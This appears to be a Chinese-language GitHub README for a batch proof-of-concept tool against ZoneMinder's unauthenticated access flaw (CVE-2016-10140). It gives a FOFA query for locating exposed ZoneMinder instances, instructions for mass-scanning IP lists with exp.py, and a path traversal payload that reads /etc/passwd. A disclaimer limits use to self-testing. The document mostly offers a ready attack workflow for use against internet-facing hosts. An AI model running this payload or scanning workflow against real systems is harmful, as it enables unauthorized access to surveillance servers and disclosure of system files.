### Zoneminder 未授权访问（CVE-2016-10140）Poc--批量验证脚本

## 漏洞描述

ZoneMinder是一款开源视频监控系统.当异常事件发生时，你就可以收到e-mail或简讯通知。ZoneMinder v1.30和v1.29捆绑的Apache HTTP Server配置中存在信息泄露和认证绕过漏洞，允许远程未认证攻击者浏览web根目录下的所有目录。

## FOFA语法

app="ZoneMinder"

## 使用方法

```
1.将准备检测的IP地址放入ip.txt文件中
2.运行python3 exp.py
```
<img width="581" alt="image" src="https://user-images.githubusercontent.com/67818638/146936773-23629846-875b-49da-ab1e-6629597d8032.png">

## PAYLOAD

```
/?view=file&path=/../../../../../etc/passwd
```

<img width="1437" alt="image" src="https://user-images.githubusercontent.com/67818638/146936822-1f4bf412-8c93-43da-9303-5dc9b03ec74d.png">

## 注意事项
本工具仅提供给安全测试人员进行安全自查使用 用户滥用造成的一切后果与作者无关 使用者请务必遵守当地法律 本程序不得用于商业用途，仅限学习交流

<img width="318" alt="iShot2021-12-23 15 42 05" src="https://user-images.githubusercontent.com/67818638/147206848-6090876d-d029-4ffd-a6a8-ee4600071404.png">
